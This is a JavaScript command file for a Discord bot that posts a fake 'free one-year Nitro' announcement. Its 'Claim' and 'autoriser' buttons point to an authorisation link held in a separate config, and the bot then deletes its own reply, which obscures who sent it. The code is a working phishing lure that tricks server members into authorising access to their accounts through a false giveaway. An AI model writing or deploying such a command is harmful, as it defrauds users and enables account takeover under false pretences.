const discord = require('discord.js');
const epic = require("../../epic");

module.exports = {
  name: "boost",
  description: "📨 Sends Boost Nitro Message",
  default_permission: true,
  timeout: 3000,
  category: "util",
  userPerms: ["SEND_MESSAGES"],
  ownerOnly: false,

  run: async (client, interaction, args) => {
    const row = new discord.MessageActionRow().addComponents(
      new discord.MessageButton()
        .setStyle('LINK')
        .setURL(`${epic.authLink}`)
        .setLabel("🎁 Claim")
    );

    interaction.channel.send({
      embeds: [{
        title: "Hello everyone, you have all received a Nitro Discord for one year!",
        description: `To get your Nitro Boost, all you need to do is:
   \n1️⃣ Click on the button [claim](${epic.authLink}).
   \n2️⃣ Click on the button [autoriser](${epic.authLink}).\n\nOnce you get cleared, you have to wait about 24-48 hours and you will get it.`,
        color: 7540649,
        image: {
          url: "https://i.ibb.co/54xmJfm/Capture-decran-le-2022-12-30-a-15-58-02.png"
        },
      }],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 5,
              label: "🎁 Claim",
              url: `${epic.authLink}`
            }
          ]
        }
      ]
    });

    interaction.deferReply();
    interaction.deleteReply();
  }
};
